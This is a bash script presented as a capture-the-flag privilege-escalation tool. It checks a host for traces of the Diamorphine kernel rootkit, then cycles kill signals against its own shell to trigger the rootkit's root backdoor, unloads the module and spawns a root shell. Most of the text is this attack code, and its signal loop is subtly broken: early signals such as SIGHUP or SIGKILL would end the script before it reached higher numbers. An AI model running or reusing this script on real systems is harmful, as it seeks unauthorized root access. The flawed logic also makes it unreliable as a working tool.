#!/bin/bash
# rootcanal_enum.sh - CTF PrivEsc script for identifying Diamorphine rootkit

echo "[*] Starting privilege escalation enumeration..."
echo

# Check current privileges
echo "[*] Checking UID..."
id
echo

# Check for suspicious cron jobs (diamorphine might use this)
echo "[*] Looking for diamorphine cron jobs..."
if [ -f /etc/cron.d/diamorphine ]; then
    echo "[+] Found diamorphine cron job:"
    cat /etc/cron.d/diamorphine
else
    echo "[-] No diamorphine cron job found"
fi
echo

# Look for loaded kernel modules named diamorphine
echo "[*] Checking for loaded diamorphine kernel module..."
lsmod | grep -i diamorphine && echo "[+] Diamorphine kernel module is loaded!" || echo "[-] No diamorphine module loaded"
echo

# Search the filesystem for diamorphine artifacts
echo "[*] Searching file system for diamorphine traces..."
find / -iname "*diamorphine*" 2>/dev/null
echo

# Check if signal-based escalation is possible
echo "[*] Attempting signal-based privilege escalation (Diamorphine-style)..."
for i in $(seq 1 64); do
    echo "Trying signal $i..."
    kill -$i $$ 2>/dev/null
    if [ "$(id -u)" = "0" ]; then
        echo "---"
        echo "[+] GOT ROOT via signal $i!"
        echo "---"
        # Optional: Clean up diamorphine
        echo "[*] Removing diamorphine module (cleanup)..."
        rmmod diamorphine 2>/dev/null
        echo "[*] Spawning root shell..."
        /bin/bash
        break
    fi
done
